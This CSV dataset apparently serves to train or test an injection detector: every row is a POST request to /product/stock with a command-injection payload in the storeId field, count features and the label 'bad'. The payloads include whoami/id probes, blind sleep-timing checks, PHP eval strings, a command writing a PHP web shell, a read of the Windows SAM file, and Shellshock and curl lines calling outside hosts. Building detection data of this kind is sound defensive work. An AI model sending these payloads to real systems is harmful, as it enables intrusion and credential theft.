method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 &&echo$IFSKBVKTU$((41+2))$(echo$IFSKBVKTU)KBVKTU\\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSRINUBZ$((32+73))$(echo$IFSRINUBZ)RINUBZ&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSAOWKBV$((93+9))$(echo$IFSAOWKBV)AOWKBV|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo KIYTJL$((54+29))$(echo KIYTJL)KIYTJL""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo FOXDLA$((60+49))$(echo FOXDLA)FOXDLA|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo FDJRHK$((66+94))$(echo FDJRHK)FDJRHK|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 && echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",0,1,1,0,1,2,0,4,bad
POST,/product/stock,productId=2&storeId=1 '|echo WEYPRV$((18+9))$(echo WEYPRV)WEYPRV&,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo GHXSEE$((91+16))$(echo GHXSEE)GHXSEE',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSBBRTZG$((50+1))$(echo$IFSBBRTZG)BBRTZG',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; dir C:\,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo RLARCW$((64+37))$(echo RLARCW)RLARCW\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo ROWALZ)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo VJZVXS); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ; type C:\Windows\repair\SAM,0,0,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo JTHMZI)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSKQIOUW$((81+20))$(echo$IFSKQIOUW)KQIOUW|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSWOMGRC$((0+46))$(echo$IFSWOMGRC)WOMGRC""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '&&echo DJDLKS$((28+16))$(echo DJDLKS)DJDLKS""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 |echo PUCKTG$((40+18))$(echo PUCKTG)PUCKTG""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 &echo TIRPSP$((59+67))$(echo TIRPSP)TIRPSP""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSURWJYQ$((9+54))$(echo$IFSURWJYQ)URWJYQ|",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 8 -ne $(echo TPTKGE | tr -d '\n' | wc -c) ] || sleep 1 &",0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSBNKFRX$((81+19))$(echo$IFSBNKFRX)BNKFRX""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${system(print(`echo QXZKBZ;echo $((59+25));echo QXZKBZ;echo QXZKBZ`);//QXZKBZ,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 &,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo XBJBDE`.`echo $((48+93))`.`echo XBJBDE`.`echo XBJBDE`);//XBJBDE",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 |,0,4,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSLVYIOD$((15+38))$(echo$IFSLVYIOD)LVYIOD//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo ZSOAWG)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 () { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",0,0,0,0,0,0,0,4,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 &&echo XKFEGJ$((1+49))$(echo XKFEGJ)XKFEGJ""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo SVPNNA$((78+23))$(echo SVPNNA)SVPNNA'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo KZZFJE;echo $((74+13));echo KZZFJE;echo KZZFJE`);%23KZZFJE",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSJHTHVW$((39+26))$(echo$IFSJHTHVW)JHTHVW',0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 6 -ne $(echo VAZLJC | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSBALCSS$((45+32))$(echo$IFSBALCSS)BALCSS//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo PLTNLH$((0+63))$(echo PLTNLH)PLTNLH//",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSSSWXIY$((27+62))$(echo$IFSSSWXIY)SSWXIY,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo WSGIYR); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo JVRRJE$((66+84))$(echo JVRRJE)JVRRJE//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSGUMDYN$((0+81))$(echo$IFSGUMDYN)GUMDYN",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSSWZDEK$((23+62))$(echo$IFSSWZDEK)SWZDEK""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSZMBRNO$((77+76))$(echo$IFSZMBRNO)ZMBRNO,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSVVUMIP$((18+35))$(echo$IFSVVUMIP)VVUMIP&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSVMXLXF$((85+89))$(echo$IFSVMXLXF)VMXLXF//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 echo ""<?php include($_GET['page']); ?>"" > rfi.php",0,0,1,0,1,2,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo NXONQU$((86+15))$(echo NXONQU)NXONQU',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo DHCFMD$((19+7))$(echo DHCFMD)DHCFMD,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSSWFONC$((23+88))$(echo$IFSSWFONC)SWFONC,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo SQSPCP$((36+68))$(echo SQSPCP)SQSPCP|",0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo UDCJAJ); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${popen(print(`echo XGFDZU`.`echo $((14+6))`.`echo XGFDZU`.`echo XGFDZU`);#XGFDZU,0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSBGJFMV$((55+92))$(echo$IFSBGJFMV)BGJFMV',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 a)|/usr/bin/id;,0,0,0,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 uname -a,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 dir C:\Users,0,0,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSUDEEGX$((28+85))$(echo$IFSUDEEGX)UDEEGX""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo TRSCUU$((6+83))$(echo TRSCUU)TRSCUU//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSMSRADT$((94+98))$(echo$IFSMSRADT)MSRADT&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %7C,0,4,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "" echo YKSYRU$((78+80))$(echo YKSYRU)YKSYRU",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HKGDXH)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo HKHVFC$((85+7))$(echo HKHVFC)HKHVFC\",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo TNPFBA); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ;{$_GET[""cmd""]}",0,0,1,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo PZDPMF$((67+92))$(echo PZDPMF)PZDPMF\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ${popen(print(`echo JDFWVW
echo $((92+86))
echo JDFWVW
echo JDFWVW`);%255C%255CJDFWVW",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo XLPJUH$((63+35))$(echo XLPJUH)XLPJUH//",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo KXJBTF$((63+25))$(echo KXJBTF)KXJBTF&,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo HRETTA$((56+9))$(echo HRETTA)HRETTA,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo NFJEZO)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo BGUGCF)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSATMXIQ$((94+83))$(echo$IFSATMXIQ)ATMXIQ\\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ';echo QDZRDC$((54+73))$(echo QDZRDC)QDZRDC\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSDKBFUT$((7+8))$(echo$IFSDKBFUT)DKBFUT',0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSTWQPEL$((97+38))$(echo$IFSTWQPEL)TWQPEL|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo UOMPHD); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo UTFROF\necho $((67+6))\necho UTFROF\necho UTFROF`);//UTFROF",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 ');}print(`echo NPFNRM;echo $((91+52));echo NPFNRM;echo NPFNRM`);%5C%5CNPFNRM,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 & ls -l /etc/,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${proc_open(print(`echo HEDLVC
echo $((95+18))
echo HEDLVC
echo HEDLVC`);//HEDLVC",0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 |echo$IFSJJIMGS$((39+63))$(echo$IFSJJIMGS)JJIMGS""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSUNCOLW$((89+19))$(echo$IFSUNCOLW)UNCOLW,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 || phpinfo(),0,0,0,2,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 && system('curl https://crowdshield.com/.testing/rce_vuln.txt');,0,1,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo FNYPPK$((77+83))$(echo FNYPPK)FNYPPK&,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSRIYZJH$((86+76))$(echo$IFSRIYZJH)RIYZJH|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo OFIKGO$((60+50))$(echo OFIKGO)OFIKGO\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo XYCPFN\necho $((60+62))\necho XYCPFN\necho XYCPFN`);XYCPFN,0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo GSKKXZ)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo PGAQQT); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo QHSDUY) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %22,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo AIBILK$((43+3))$(echo AIBILK)AIBILK'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '| [ 3 -ne $(echo YGAAWQ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'print(`echo CRERAD;echo $((48+33));echo CRERAD;echo CRERAD`);//CRERAD,0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 1 -ne $(echo EUILIT | tr -d '\n' | wc -c) ] || sleep 1 '",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo GZDPZK$((6+29))$(echo GZDPZK)GZDPZK\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 |echo$IFSGFJBIP$((75+97))$(echo$IFSGFJBIP)GFJBIP""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSBUSFOU$((97+37))$(echo$IFSBUSFOU)BUSFOU,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSASRUTA$((40+74))$(echo$IFSASRUTA)ASRUTA&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo WSGIYR); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ; str=$(echo POEKQX); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo TSTIED;echo $((94+6));echo TSTIED;echo TSTIED`);%29%7DTSTIED,0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 '
echo SZLYQY$((17+3))$(echo SZLYQY)SZLYQY""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 9 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo HSRGRG) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %7C,0,4,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 
echo KEARQO$((52+94))$(echo KEARQO)KEARQO|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo BDNTCM$((25+80))$(echo BDNTCM)BDNTCM//,0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo AIVPGH) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |id|,0,0,0,2,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSOIATXB$((46+82))$(echo$IFSOIATXB)OIATXB|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo LOCFPZ)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
